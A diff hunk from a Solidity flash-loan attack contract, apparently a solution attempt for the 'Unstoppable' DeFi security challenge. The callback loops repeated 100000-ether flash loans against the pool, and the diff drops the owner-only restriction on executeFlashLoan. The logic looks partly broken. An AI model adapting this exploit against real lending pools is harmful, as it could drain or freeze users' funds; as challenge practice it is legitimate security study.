@@ -25,16 +25,16 @@ contract AttackReceiverUnstoppable is Owned, IERC3156FlashBorrower {
         uint256 fee,
         bytes calldata
     ) external returns (bytes32) {
-        while( ERC20(_token).balanceOf( address( pool)) > 0){
+        while( ERC20(token).balanceOf( address( pool)) > 0){
             executeFlashLoan(100000 ether);
-            return true;
+            return keccak256("IERC3156FlashBorrower.onFlashLoan");
         }
         ERC20(token).approve(address(pool), amount);
 
         return keccak256("IERC3156FlashBorrower.onFlashLoan");
     }
 
-    function executeFlashLoan(uint256 amount) external onlyOwner {
+    function executeFlashLoan(uint256 amount) public {
         address asset = address(pool.asset());
         pool.flashLoan(
             this,
